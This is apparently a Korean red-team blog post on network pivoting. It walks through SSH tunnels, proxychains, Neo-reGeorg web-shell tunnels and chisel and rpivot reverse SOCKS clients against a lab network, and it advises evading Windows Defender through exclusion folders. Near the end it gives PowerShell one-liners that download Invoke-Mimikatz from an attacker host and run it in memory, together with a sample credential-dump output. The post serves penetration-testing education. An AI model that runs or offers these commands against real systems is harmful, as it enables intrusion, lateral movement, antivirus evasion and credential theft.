---
layout: post
title:  "Network Pivoting with Proxychains with (aka. MITRE ATT&CK [T1090, T1021])"
author: "Yoobi"
comments: true
tags: [Network Pivoting, SSH Tunneling, Proxychains, Neo-reGeorg, chisel, Rpivot, Lateral Movement, Command and Control]
---
라온시큐어 화이트햇센터 핵심연구팀 유병일

레드티밍(침투테스트) 진행 시 초기 침투 이후 내부망으로의 Network Pivot을 위해 다양한 기술 사용합니다. 본 포스팅에서는 Proxychains을 활용한 Network Pivoting 기법을 공유합니다.

# MITRE ATT&CK [T1090, T1021]

- [T1090 - [Command and Control] Proxy](https://attack.mitre.org/techniques/T1090/)
- [T1021 - [Lateral Movement] Remote Services](https://attack.mitre.org/techniques/T1021/)

MITRE ATT&CK은 201개의 기법을 정의하고 있습니다. 관점에 따라 같은 행위더라도 여러 기법으로 매핑될 수 있지만 Network Pivoting은 T1090 → T1021 순서로 진행된다고 할 수 있습니다.

실제 공격그룹의 공격 진행에서도 자주 관찰되는 공격 기법입니다.

참고

- APT39
- [https://attack.mitre.org/groups/G0087/](https://attack.mitre.org/groups/G0087/)

# SSH Tunneling

Dynamic Tunneling을 통한 Proxychains을 설명하기 앞서 Local Tunneling과 Remote Tunneling 먼저 설명드리겠습니다.

실제 운영 서비스는 대부분 네트워크 DMZ(Demilitarized Zone)을 통해 외부 서비스를 관리하고 있으며, 내부 임직원을 위한 내부 서비스는 내부망에 존재하여 외부에서의 접근이 불가합니다.

![Untitled](/assets/2024-03-20//Untitled.png)

우선, 네트워크 DMZ(Demilitarized Zone)을 통해 내부망 서버의 SSH 서비스가 오픈 되어있는 환경입니다. 해당 서비스에 대한 접속 정보는 사전에 탈취했다고 가정하겠습니다.

- ID/PW : user/test

이러한 환경에서는 Local Tunneling을 통해 DMZ에 존재하지 않는 내부망 서비스 침투가 가능합니다.

![Untitled](/assets/2024-03-20//Untitled%201.png)

보시다시피 Server2 서비스는 외부에 오픈되지 않은 서비스이지만 아래와 같이 Local Tunneling을 연결하여 외부에서 강제로 접속할 수 있습니다.

```powershell
# Victim Public Domain : test.kimmongyong.kr
# Victim DMZ SSH Server : 172.16.10.100
# Victim Internal Network Server 2 : 172.16.10.254
# Attacker SSH Client : localhost

# 외부에서 DMZ로 연결
> ssh user@test.kimmongyong.kr -L 10500:172.16.10.254:80
```

[http://localhost:10500](http://localhost:10500) 연결 시 웹 서비스 접근이 가능합니다.

![Untitled](/assets/2024-03-20//Untitled%202.png)

해당 과정이 진행될 때의 네트워크 패킷을 확인해보도록 하겠습니다.

![Untitled](/assets/2024-03-20//Untitled%203.png)

해당 http 패킷 흐름을 통해 외부 공격자가 [http://localhost:10500](http://localhost:10500) 을 통해 접근을 시도할 때 마다, Victim DMZ SSH Server 2(172.16.10.100) ↔ Victim Internal Network Server 2(172.16.10.254)이 통신되는 것을 확인할 수 있습니다.

![Untitled](/assets/2024-03-20//Untitled%204.png)

그리고 Victim DMZ SSH Server 2(172.16.10.100) 통신 패킷 전체를 확인해보면 Attacker ↔ Victim DMZ SSH Server 2(172.16.10.100)의 SSH 통신 이후에 TCP 통신이 진행되며, TCP 통신 이후에 SSH 통신으로 Attacker에게 패킷이 전달되는 것을 확인할 수 있습니다.

다음 환경은 네트워크 DMZ에 SSH 서비스가 없는 환경입니다.

![Untitled](/assets/2024-03-20//Untitled%205.png)

해당 환경에서 가장 중요한 점은 DMZ 내의 호스트를 SSH client 삼아 외부의 거점서버로 SSH Tunneling을 연결한다는 것입니다.

여기서 선제 조건은 DMZ 내의 호스트 탈취가 먼저 이루어져야 합니다. 파일 업로드, 커맨드 인젝션, 1-day RCE 등 다양한 방법을 통한 DMZ 내의 호스트에 대한 원격 명령 실행이 먼저 진행되어야 합니다. 

```bash
# Victim Public Domain : test.kimmongyong.kr
# Victim Internal Network Server 1 : 172.16.10.100
# Victim SSH Client : 172.16.10.100
# Victim Internal Network Server 2 : 172.16.10.254
# SSH Base SSH Server : pentest.yoobi.kr

# DMZ 서버에서 외부 거점서버로 연결
# 아래 명령어가 실행되는 호스트 : 172.16.10.100
$ ssh root@pentest.yoobi.kr -p 10500 -R 10501:172.16.10.254:80
```

해당 과정이 진행될 때의 네트워크 패킷을 확인해보도록 하겠습니다. 

![Untitled](/assets/2024-03-20//Untitled%206.png)

Victim Internal Network Server 1(172.16.10.100)에서 확인한 결과 Local Tunneling과 동일한 형태로 SSH 통신 이후에 TCP 통신 연결시도가 진행되며, TCP 통신 이후에 SSH 통신으로 공격자에게 패킷이 전달되는 것을 확인할 수 있습니다.

위 캡처에서 SSH 포트가 22로 설정되지 않아 SSHv2가 아닌 TCP 프로토콜로 표시되었지만, 해당 패킷의 TCP Stream 확인 시 SSH 패킷임을 확인할 수 있습니다.

![Untitled](/assets/2024-03-20//Untitled%207.png)

중요한 점은 해당 과정을 통해 DMZ에 포워딩 되어 있지 않은 내부 서비스 접속 시, 거점 서버의 IP만 노출될 뿐 공격자 IP는 노출되지 않는 것을 확인할 수 있습니다. 이 또한, 방화벽 로그나 SSH 통신 로그를 기록하지 않는다면 Victim Internal Network Server 2(172.16.10.254)의 로그에는 공격자 IP가 노출되지 않습니다.

Dynamic Tunneling은 Local Tunneling의 조건과 동일하게 네트워크 DMZ에 SSH 서버가 존재할 때 아래와 같이 SOCK5 통신을 통한 내부망 접근 환경을 구성할 수 있습니다.

![Untitled](/assets/2024-03-20//Untitled%208.png)

내부망에 SSH 서버가 존재하지만 DMZ에 포트포워딩 되어 있지 않은 환경이라고 하더라도, DMZ에 존재하는 서버의 원격명령실행이 가능하다면 DMZ가 아닌 내부망에 존재하는 SSH 서버의 서비스 포트를 Remote Tunneling을 통해 외부의 접근이 가능한 환경으로 만든 뒤, Dynamic Tunneling을 설정해도 동일한 내부망 접근 환경을 구성할 수 있습니다.

![Untitled](/assets/2024-03-20//Untitled%209.png)

```powershell
# Victim Public Domain : test.kimmongyong.kr
# Victim SSH Server : 172.16.10.100
# Victim Internal Network Server 2 : 172.16.10.254
# Victim Internal Network Server 3 : 172.16.10.6

# 외부에서 DMZ로 연결
> ssh user@test.kimmongyong.kr -D 1080 -vv
```

구성 후 SOCK5 프록시 설정 진행 시, 내부망 통신이 가능하며 아래와 같이 172.16.10.0/24 웹서비스에 모두 접근이 가능한 것을 확인할 수 있습니다.

![Untitled](/assets/2024-03-20//Untitled%2010.png)

![Untitled](/assets/2024-03-20//Untitled%2011.png)

이 때의 Victim SSH Server(172.16.10.100) 서버 통신 패킷은 아래와 같습니다.

![Untitled](/assets/2024-03-20//Untitled%2012.png)

SOCKS 통신을 통한 내부망 웹서비스 접근은 가능하여 Burp Suite, Fiddler를 사용한 웹 취약점 진단도 가능한 환경을 구성할 수 있습니다.

다만, SMB, SMTP, FTP, RDP 등에 대한 접근은 불가능한 환경입니다.

# ProxyChains

[https://www.kali.org/tools/proxychains-ng/](https://www.kali.org/tools/proxychains-ng/)

Proxychains을 통해 모든 TCP 트래픽을 SOCK 통신을 통해 통신되도록 설정할 수 있습니다.

설정 방법

```bash
$ cat /etc/proxychains.conf

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
#socks4         127.0.0.1 9050
socks5 127.0.0.1 1080
```

이후 proxychains를 통한 명령어 실행 시, 모든 TCP 통신이 가능한 것을 확인할 수 있습니다.

```bash
$ proxychains nmap -sT -Pn -v 172.16.10.6
```

![Untitled](/assets/2024-03-20//Untitled%2013.png)

아래와 같이 ssh 접속도 가능합니다.

```bash
$ proxychains ssh root@172.16.10.6
```

![Untitled](/assets/2024-03-20//Untitled%2014.png)

Proxychains을 사용하면 웹 서비스만 접근 가능한 제한을 넘어서 nmap과 같은 다양한 공격 도구를 제약없이 활용이 가능합니다.

SSH Tunneling을 통한 내부망 침투 과정은 전제 조건이 있는데, 바로 사용 가능한 ssh 접속 정보가 있어야 한다는 점입니다. 취약점으로 찾은 원격 명령 실행 결과 서비스가 구동 되고 있는 계정이 root라면 임의의 계정을 생성하여 진행할 수 있습니다.

서비스 구동 계정이 root가 아니고, 탈취한 ssh 접속 정보가 없다면 SOCK5 연결을 열 수 없기 때문에 Proxychains를 사용할 수 없습니다.

아래 과정은 Reverse SOCK5/SOCK4를 통해 강제로 sock을 개방하여 Network Pivoting을 하는 과정입니다.

![Untitled](/assets/2024-03-20//Untitled%2015.png)

# Neo-reGeorg

[https://github.com/L-codes/Neo-reGeorg/blob/master/README-en.md](https://github.com/L-codes/Neo-reGeorg/blob/master/README-en.md)

만약 탈취한 원격 명령 실행이 가능한 서버가 웹 서버라면 SSH 접속 정보가 없는 환경에서도 강제로 SOCK5 통신을 생성이 가능합니다. Neo-reGeorg 도구는 jsp, asp, php, go를 지원합니다.

가장 범용적으로 사용되는 jsp, php asp에 대한 테스트를 진행하도록 하겠습니다.

먼저 SOCK5 통신 오픈에 사용할 코드를 생성합니다.

```bash
$ python neoreg.py generate -k password

    [+] Create neoreg server files:
       => neoreg_servers/tunnel.jsp
       => neoreg_servers/tunnel.jspx
       => neoreg_servers/tunnel.aspx
       => neoreg_servers/tunnel.php
```

## JSP

생성된 jsp 코드를 테스트용 웹 서버에 업로드합니다.

![Untitled](/assets/2024-03-20//Untitled%2016.png)

이후 neoreg.py를 통해 SOCK5 통신을 열면 127.0.0.1:1080이 활성화되는 것을 확인할 수 있습니다.

```bash
# attacker
$ python3 neoreg.py -k password -u http://pentest.yoobi.kr:10501/tunnel2/tunnel.jsp
```

![Untitled](/assets/2024-03-20//Untitled%2017.png)

활성된 SOCK5 포트를 사용한 proxychains을 통해 내부망 접근이 가능합니다.

![Untitled](/assets/2024-03-20//Untitled%2018.png)

## PHP

동일하게 테스트용 웹 서버에 tunnel.php 파일을 업로드합니다.

![Untitled](/assets/2024-03-20//Untitled%2019.png)

이후 neoreg.py를 통해 SOCK5 통신을 열면 127.0.0.1:1080이 활성화되는 것을 확인할 수 있습니다.

```bash
# attacker
$ python3 neoreg.py -k password -u http://pentest.yoobi.kr:10501/tunnel.php
```

![Untitled](/assets/2024-03-20//Untitled%2020.png)

활성된 SOCK5 포트를 사용한 proxychains을 통해 내부망 접근이 가능합니다.

![Untitled](/assets/2024-03-20//Untitled%2021.png)

## ASP

동일하게 테스트용 웹 서버에 tunnel.asp 파일을 업로드합니다.

![Untitled](/assets/2024-03-20//Untitled%2022.png)

이후 neoreg.py를 통해 SOCK5 통신을 열면 127.0.0.1:1080이 활성화되는 것을 확인할 수 있습니다.

```bash
python3 neoreg.py -k password -u http://pentest.yoobi.kr:10502/tunnel.aspx
```

![Untitled](/assets/2024-03-20//Untitled%2023.png)

활성된 SOCK5 포트를 사용한 proxychains을 통해 내부망 접근이 가능합니다.

![Untitled](/assets/2024-03-20//Untitled%2024.png)

이 처럼 Neo-reGeorg 도구를 활용하여 SSH 서비스에 대한 접속 정보가 없더라도 강제로 SOCK5 통신을 생성하여 proxychain 사용이 가능합니다. 

다만, 이 또한 원격 명령 실행이 가능하도록 탈취한 서버가 웹 서버가 아닐 경우 SOCK5 연결을 열 수 없기 때문에 Proxychains를 사용할 수 없습니다.

# chisel

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)

만약 탈취한 원격 명령 실행이 가능한 서버가 웹 서버가 아니더라도 chisel을 사용하여 강제로 sock5 포트를 열어서 proxychains을 사용할 수 있습니다. 해당 도구는 바이너리 형태로 제공되며 리눅스, 윈도우 모두 지원하기에 활용도가 매우 높습니다.

```bash
# attacker
$ chisel server -p 10505 --reverse
```

![Untitled](/assets/2024-03-20//Untitled%2025.png)

## Linux

```powershell
# victim
$ ./chisel_1.9.1_linux_amd64 client 124.60.4.10:10505 R:socks
```

![Untitled](/assets/2024-03-20//Untitled%2026.png)

# Window

```powershell
# victim
> .\chisel.exe client 124.60.4.10:10505 R:socks
```

![Untitled](/assets/2024-03-20//Untitled%2027.png)

단, 윈도우 서버는 윈도우 디펜더에서 chisel.exe를 악성코드로 탐지하고 있습니다. 탈취한 윈도우 서버의 권한이 높을 경우(Administrator, SYSTEM) 제외 폴더 지정을 통해 우회할 수 있습니다.

다음과 같이 연결 시,  127.0.0.1:1080 SOCK5 통신이 활성화되는 것을 확인할 수 있습니다.

![Untitled](/assets/2024-03-20//Untitled%2028.png)

활성된 SOCK5 포트를 사용한 proxychains을 통해 내부망 접근이 가능합니다.

![Untitled](/assets/2024-03-20//Untitled%2029.png)

이 처럼 chicel 도구를 활용하여 SSH 서비스에 대한 접속 정보가 없고 탈취한 서버가 웹서버가 아니더라도 강제로 SOCK5 통신을 생성하여 proxychain 사용이 가능합니다. 

# Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot 도구는 chisel과 유사하지만 바이너리 형태가 아닌 python 2 소스코드 형태의 도구이며 sock4 통신을 열 수 있습니다. 해당 도구를 사용하여 강제로 sock4 포트를 열어서 proxychains을 사용할 수 있습니다. 바이너리 형태인 chisel에 비해 소스코드 형태로 구성되어 있고 행위가 sock4 통신을 여는 것이기 때문에 백신에서 악성행위로 탐지 및 차단하기가 어렵습니다.

sock4 이므로 /etc/proxychains.conf 를 sock4로 수정 적용하여야 합니다.

```powershell
$ cat /etc/proxychains.conf

[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4 127.0.0.1 1080
#socks5 127.0.0.1 1080
```

```powershell
# attacker
$ python2 server.py --server-port 10505 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

![Untitled](/assets/2024-03-20//Untitled%2030.png)

## Linux

```powershell
# victim no need root
$ python client.py --server-ip 124.60.4.10 --server-port 10505
```

![Untitled](/assets/2024-03-20//Untitled%2031.png)

# Window

```powershell
# vicitm no need administrator
> C:\Python27\python.exe .\client.py --server-ip 124.60.4.10 --server-port 10505
```

![Untitled](/assets/2024-03-20//Untitled%2032.png)

다음과 같이 연결 시,  127.0.0.1:1080 SOCK5 통신이 활성화되는 것을 확인할 수 있습니다.

![Untitled](/assets/2024-03-20//Untitled%2033.png)

활성된 SOCK4 포트를 사용한 proxychains을 통해 내부망 접근이 가능합니다.

![Untitled](/assets/2024-03-20//Untitled%2034.png)

해당 도구는 바이너리 형태가 아니기 때문에 python 2가 필요합니다. 대상 서버에 임의 설치가 불가한 상황이라면 python2 포터블을 활용할 수 있습니다.

for window

[https://github.com/sganis/pyportable/releases/download/v2.7.10rc1/pyportable-2.7.10rc1.zip](https://github.com/sganis/pyportable/releases/download/v2.7.10rc1/pyportable-2.7.10rc1.zip)

이 처럼 rpivot 도구를 활용하여 SSH 서비스에 대한 접속 정보가 없고 탈취한 서버가 웹서버가 아니더라도 강제로 SOCK4 통신을 생성하여 proxychain 사용이 가능합니다.

따라서, 주어진 환경에 맞춰 chisel과 rpivot 중 유동적으로 사용하면 됩니다.

# Future Plan

지금까지 SSH Tunneling, Neo-reGeorg, chisel, rpivot 등을 활용하여 내부망 침투 환경을 구성하는 다양한 방법을 살펴보았습니다.

최근 다양한 악성파일 탐지 기술의 발전함에 따라 특히 윈도우 공격은 powershell을 활용한 fileless 공격이 성행하고 있습니다. 아래와 같이 실행 시, 공격대상 호스트OS에 파일이 저장되지 않은 채 함수를 불러오고 실행하는 것이 가능합니다.

```powershell
# IN MEMORY SCRIPT (fileless)
PS> IEX(New-Object Net.Webclient).DownloadString('http://10.8.0.55:8000/Invoke-Mimikatz.ps1')
PS> Get-Help Invode-Mimikatz

# GET NTML hash
PS> Invoke-Mimikatz -DumpCreds
<#
Hostname: ECYOOBI-ECYOOBI/ S-1-5-21-2601599994-785418798-88965947

  .#####.   mimikatz 2.2.0 (x64) #19041 Jan 29 2023 07:49:10
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz(powershell) # sekurlsa::logonpasswords

Authentication Id : 0 ; 238873 (00000000:0003a519)
Session           : RemoteInteractive from 2
User Name         : Administrator
Domain            : ECYOOBI-ECYOOBI
Logon Server      : ECYOOBI-ECYOOBI
Logon Time        : 2/20/2024 2:33:03 AM
SID               : S-1-5-21-2601599994-3782906710-785418798-500
        msv :
         [00000003] Primary
         * Username : Administrator
         * Domain   : ECYOOBI-ECYOOBI
         * NTLM     : 121212121212121212121212
         * SHA1     : 121212121212121212121212121212121212
         * DPAPI    : 12121212121212121212121212121212
        tspkg :
        wdigest :
         * Username : Administrator
         * Domain   : ECYOOBI-ECYOOBI
         * Password : (null)
        kerberos :
         * Username : Administrator
         * Domain   : ECYOOBI-ECYOOBI
         * Password : (null)
        ssp :
        credman :
#>
```

위 처럼 온전한 powershell이 아닌, 웹쉘과 같은 환경이더라도 아래와 같이 one-liner을 통한 공략이 가능합니다.

```powershell
PS> powershell -C "ls; whoami;"
PS> powershell -C "IEX(New-Object Net.Webclient).DownloadString('http://10.8.0.55:8000/Invoke-Mimikatz.ps1'); Get-Help Invode-Mimikatz; Invoke-Mimikatz -DumpCreds;"
```

후속 연구로는 위 Reverse SOCK4/SOCK5를 통한 Network Pivoting 과정을 powershell 코드로 제작하여 fileless 형태의 공격 도구를 제작할 예정입니다. 감사합니다.

Special Thanks to [kimmongyong](https://blog.kimmongyong.kr/) for share his own server resources.

Refer

[https://attack.mitre.org/](https://attack.mitre.org/)

[https://attack.mitre.org/techniques/T1090/](https://attack.mitre.org/techniques/T1090/)

[https://attack.mitre.org/techniques/T1021/](https://attack.mitre.org/techniques/T1021/)

[https://attack.mitre.org/groups/G0087/](https://attack.mitre.org/groups/G0087/)

[https://core-research-team.github.io/2020-04-01/Multiple-tunneling](https://core-research-team.github.io/2020-04-01/Multiple-tunneling)

[https://hbase.tistory.com/328](https://hbase.tistory.com/328)

[https://blog.naver.com/sujunghan726/220325307918](https://blog.naver.com/sujunghan726/220325307918)

[https://www.레드팀.com/lateral-movement/dynamic-port-fowarding](https://www.xn--hy1b43d247a.com/lateral-movement/dynamic-port-fowarding)

[https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6](https://posts.specterops.io/offensive-security-guide-to-ssh-tunnels-and-proxies-b525cbd4d4c6)

[https://medium.com/swlh/proxying-like-a-pro-cccdc177b081](https://medium.com/swlh/proxying-like-a-pro-cccdc177b081)

[https://www.ired.team/offensive-security/lateral-movement/ssh-tunnelling-port-forwarding](https://www.ired.team/offensive-security/lateral-movement/ssh-tunnelling-port-forwarding)

[https://github.com/L-codes/Neo-reGeorg/blob/master/README-en.md](https://github.com/L-codes/Neo-reGeorg/blob/master/README-en.md)

[https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)